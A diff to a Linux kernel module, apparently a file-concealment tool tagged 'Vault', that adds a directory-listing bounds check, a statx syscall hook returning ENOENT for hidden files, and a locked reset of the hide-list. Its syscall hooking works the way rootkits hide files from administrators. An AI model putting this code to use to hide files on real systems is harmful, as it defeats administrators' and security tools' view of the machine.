@@ -97,6 +97,11 @@ static long filter_dirents(void *kdirp, long ret, size_t name_off) {
         unsigned short reclen = *(unsigned short *)(cur + 16);
         const char *name = cur + name_off;
 
+        /* A zero/oversized d_reclen means a corrupted buffer — an
+         * unguarded `cur += 0` here would spin forever IN KERNEL. */
+        if (reclen == 0 || cur + reclen > end)
+            break;
+
         if (should_hide_file(name)) {
             if (keep)
                 *(unsigned short *)(keep + 16) += reclen;
@@ -256,12 +261,55 @@ asmlinkage long hooked_unlinkat(const struct pt_regs *regs) {
     return orig_unlinkat(regs);
 }
 
+/* ================================================================
+ * statx hook — hidden files must not be discoverable via
+ * stat()/lstat()/find either.  Before v3.2 only open/unlink were
+ * blocked, so `stat hidden_file` happily confirmed its existence.
+ * ================================================================ */
+asmlinkage long hooked_statx(const struct pt_regs *regs) {
+    long (*orig_statx)(const struct pt_regs *);
+    const char __user *pathname = (const char __user *)regs->si;
+    char kpath[256];
+    char *filename;
+
+    orig_statx = (void *)hooks[HOOKIDX_STATX].original;
+
+    if (pathname) {
+        if (strncpy_from_user(kpath, pathname, sizeof(kpath) - 1) > 0) {
+            kpath[sizeof(kpath) - 1] = '\0';
+            /* Empty pathname (AT_EMPTY_PATH trick) stats the fd —
+             * leave it alone. */
+            if (kpath[0] != '\0') {
+                filename = strrchr(kpath, '/');
+                if (filename)
+                    filename++;
+                else
+                    filename = kpath;
+
+                if (should_hide_file(filename) || should_hide_file(kpath)) {
+                    return -ENOENT;
+                }
+            }
+        }
+    }
+
+    return orig_statx(regs);
+}
+
 int file_hide_init(void) {
     pr_info(VAULT_KERNEL_TAG " file hiding initialized (max=%d)\n", MAX_HIDDEN_FILES);
     return 0;
 }
 
 void file_hide_cleanup(void) {
-    hidden_file_count = 0;
+    file_hide_reset();
     pr_info(VAULT_KERNEL_TAG " file hiding cleaned\n");
+}
+
+/* Wipe the whole hide-list under the lock (IOCTL_RESET_ALL) */
+void file_hide_reset(void) {
+    unsigned long flags;
+    spin_lock_irqsave(&file_hide_lock, flags);
+    hidden_file_count = 0;
+    spin_unlock_irqrestore(&file_hide_lock, flags);
 }
